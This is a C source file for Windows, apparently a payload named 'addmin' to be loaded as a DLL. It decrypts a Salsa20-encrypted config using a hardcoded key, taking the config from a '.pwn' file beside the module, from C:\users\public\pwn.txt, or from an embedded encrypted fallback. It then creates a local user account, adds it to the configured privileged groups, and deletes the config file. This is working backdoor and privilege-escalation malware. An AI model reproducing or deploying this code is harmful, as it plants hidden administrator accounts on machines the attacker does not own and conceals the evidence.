#include <lm.h>
#include <sddl.h>
#include <tchar.h>
#include <windows.h>

#include <stdint.h>

#include "salsa20.h"
#include "util.h"


#define CONFIG_MAX_LINE_LENGTH 256
#define CONFIG_MAX_SIZE 4096

#define ADDMIN_STATUS_SUCCESS 1
#define ADDMIN_STATUS_ERROR 0

#define MARKER_USERNAME "username="
#define MARKER_PASSWORD "password="
#define MARKER_GROUPSID "groupsid="

static uint8_t KEY[16] = { 217, 78, 5, 76, 59, 107, 8, 44, 116, 168, 84, 50, 232, 185, 198, 130 };

// comment the next line to disable fallback to fixed config
#define ADDMIN_FALLBACK_CONFIG

// comment the next line to disable fallback to a default search path for the config file
#define ADDMIN_DEFAULT_CONFIG_LOCATION

#ifdef ADDMIN_FALLBACK_CONFIG
#include "../addmin-shared/hex.h"
#define CONFIG_DEFAULT "52455a1146bc0e620589a6ca53b3d887668c3a71320800c203dd967eaad3ff08c9827127df2fdedec247e35912289a4f93c6f012ae80632ca39dc0627d0648495902a2d565fad3da824dfc2be50b25a2abaf4c485ff565d941173e8cbd9dedaebf"
#endif

#ifdef ADDMIN_DEFAULT_CONFIG_LOCATION
// set the fallback search path here
#define CONFIG_FALLBACK_PATH TEXT("C:\\users\\public\\pwn.txt")
#endif

// statically allocated memory to avoid dynamic allocation
char configBuf[CONFIG_MAX_SIZE];
WCHAR lineBufUsername[CONFIG_MAX_LINE_LENGTH];
WCHAR lineBufPassword[CONFIG_MAX_LINE_LENGTH];
WCHAR lineBufGroupSids[4 * CONFIG_MAX_LINE_LENGTH];

typedef struct _config {
    LPWSTR username;
    LPWSTR password;
    LPWSTR groupSids[4];
} config;

void decryptConfigBuffer(const char* nonceBuf, char* dataBuf, size_t dataBufSize) {
    s20_crypt((uint8_t*)KEY, (uint8_t*)nonceBuf, 0, (uint8_t*)dataBuf, (uint32_t)dataBufSize);
}

int addUser(LPWSTR name, LPWSTR pw) {
    USER_INFO_1 userInfo;
    userInfo.usri1_name = name;
    userInfo.usri1_password = pw;
    userInfo.usri1_priv = USER_PRIV_USER;
    userInfo.usri1_home_dir = NULL;
    userInfo.usri1_comment = NULL;
    userInfo.usri1_flags = UF_SCRIPT;
    userInfo.usri1_script_path = NULL;

    return NetUserAdd(NULL, 1, (LPBYTE)&userInfo, NULL) == NERR_Success ? ADDMIN_STATUS_SUCCESS : ADDMIN_STATUS_ERROR;
}

int addUserToGroup(LPWSTR userName, LPWSTR groupSIDStr) {
    PSID groupSID;
    if (!ConvertStringSidToSid(groupSIDStr, &groupSID)) {
        return ADDMIN_STATUS_ERROR;
    }

    SID_NAME_USE sidType;
    DWORD cchName = CONFIG_MAX_LINE_LENGTH;
    WCHAR groupName[CONFIG_MAX_LINE_LENGTH];
    DWORD cchReferencedDomainName = CONFIG_MAX_LINE_LENGTH;
    WCHAR referencedDomainName[CONFIG_MAX_LINE_LENGTH];

    if (LookupAccountSid(NULL, groupSID, groupName, &cchName, referencedDomainName, &cchReferencedDomainName, &sidType) == FALSE) {
        return ADDMIN_STATUS_ERROR;
    }

    LOCALGROUP_MEMBERS_INFO_3 gmInfo;
    gmInfo.lgrmi3_domainandname = userName;
    return NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&gmInfo, 1) == NERR_Success ? ADDMIN_STATUS_SUCCESS : ADDMIN_STATUS_ERROR;
}

BOOL toWstr(const char* str, LPWSTR outBuf, size_t outBufSize) {
    int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    if (size > outBufSize) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, str, -1, outBuf, size);
    return TRUE;
}

int readConfig(LPCWSTR path, uint8_t* outBuf, size_t outBufSize, size_t* bytesRead) {
    HANDLE fileHandle;
    DWORD fileSize;

    fileHandle = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        return ADDMIN_STATUS_ERROR;
    }

    fileSize = GetFileSize(fileHandle, NULL);
    if (fileSize > outBufSize) {
        goto fail;
    }

    DWORD read;
    if (!ReadFile(fileHandle, outBuf, fileSize, &read, NULL)) {
        goto fail;
    }
    CloseHandle(fileHandle);

    *bytesRead = read;
    return ADDMIN_STATUS_SUCCESS;

fail:
    CloseHandle(fileHandle);
    return ADDMIN_STATUS_ERROR;
}

int parseConfig(const uint8_t* configBuf, size_t configLen, config* outConfig) {
    char lineDelim = '\n';
    char* lineStart = (char*)configBuf;
    uint8_t numGroupsSids = 0;

    while (lineStart < (char*)(configBuf + configLen)) {
        char* lineEnd = (char*)std_strchr(lineStart, lineDelim);
        if (lineEnd) {
            *lineEnd = 0;
        } else {
            lineEnd = (char*)(configBuf + configLen);
        }

        size_t maxLeft = ((char*)(configBuf + configLen)) - lineStart;
        size_t cmpLenUsername = min(sizeof(MARKER_USERNAME) - 1, maxLeft);
        size_t cmpLenPassword = min(sizeof(MARKER_PASSWORD) - 1, maxLeft);
        size_t cmpLenGropSids = min(sizeof(MARKER_GROUPSID) - 1, maxLeft);
        if (strncmp(MARKER_USERNAME, lineStart, cmpLenUsername) == 0) {
            outConfig->username = lineBufUsername;
            toWstr(lineStart + min(sizeof(MARKER_USERNAME) - 1, maxLeft), lineBufUsername, CONFIG_MAX_LINE_LENGTH);
        } else if (strncmp(MARKER_PASSWORD, lineStart, cmpLenPassword) == 0) {
            outConfig->password = lineBufPassword;
            toWstr(lineStart + min(sizeof(MARKER_PASSWORD) - 1, maxLeft), lineBufPassword, CONFIG_MAX_LINE_LENGTH);
        } else if (strncmp(MARKER_GROUPSID, lineStart, cmpLenGropSids) == 0) {
            if (numGroupsSids < 4) {
                outConfig->groupSids[numGroupsSids] = lineBufGroupSids + (numGroupsSids * CONFIG_MAX_LINE_LENGTH);
                toWstr(lineStart + min(sizeof(MARKER_GROUPSID) - 1, maxLeft), outConfig->groupSids[numGroupsSids], CONFIG_MAX_LINE_LENGTH);
                ++numGroupsSids;
            }
        }

        lineStart = lineEnd + 1;
    }

    return ADDMIN_STATUS_SUCCESS;
}

int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLen) {
    char *buf = configBuf;
    size_t bytesRead = 0;
    int configFound = TRUE;

    char *configBuf = buf + 8;
    size_t configSize;
    if (readConfig(configPath, buf, CONFIG_MAX_SIZE - 1, &bytesRead)) {
        configSize = bytesRead - 8;
        decryptConfigBuffer(buf, configBuf, configSize);
        configBuf[configSize] = 0;
    } else {
        configFound = FALSE;
        if (fixedFallback) {
            configSize = min(fixedFallbackLen - 8, CONFIG_MAX_SIZE - 9);
            std_memcpy(buf, fixedFallback, fixedFallbackLen);
            decryptConfigBuffer(buf, configBuf, configSize);
            configBuf[configSize] = 0;
        } else {
            return ADDMIN_STATUS_ERROR;
        }
    }

    config conf;
    conf.username = NULL;
    conf.password = NULL;
    memset(conf.groupSids, 0, sizeof(conf.groupSids));
    parseConfig(configBuf, configSize, &conf);


    int status = addUser(conf.username, conf.password);
    if (status == ADDMIN_STATUS_SUCCESS) {
        for (size_t i = 0; i < 4; ++i) {
            if (conf.groupSids[i]) {
                addUserToGroup(conf.username, conf.groupSids[i]);
            }
        }
        if (configFound) {
            DeleteFile(configPath);
        }
    }

    return ADDMIN_STATUS_SUCCESS;
}

 __forceinline void addminMain(HMODULE hModule) {
    TCHAR primaryConfigPath[MAX_PATH];

    GetModuleFileName(hModule, primaryConfigPath, MAX_PATH);
    size_t len = _tcslen(primaryConfigPath);
    primaryConfigPath[len - 3] = 'p';
    primaryConfigPath[len - 2] = 'w';
    primaryConfigPath[len - 1] = 'n';

    TCHAR* configPath = primaryConfigPath;

    #ifdef ADDMIN_DEFAULT_CONFIG_LOCATION
    DWORD fileAttribs = GetFileAttributes(primaryConfigPath);
    if ((fileAttribs == INVALID_FILE_ATTRIBUTES) || (fileAttribs & FILE_ATTRIBUTE_DIRECTORY)) {
        configPath = CONFIG_FALLBACK_PATH;
    }
    #endif

    #ifdef ADDMIN_FALLBACK_CONFIG
    char fallbackConfig[CONFIG_MAX_SIZE];
    size_t fallbackConfigLen = decodeHex(CONFIG_DEFAULT, sizeof(CONFIG_DEFAULT) - 1, fallbackConfig, sizeof(fallbackConfig));
    addmin(configPath, fallbackConfig, fallbackConfigLen);
    #else
    addmin(configPath, NULL, 0);
    #endif
}
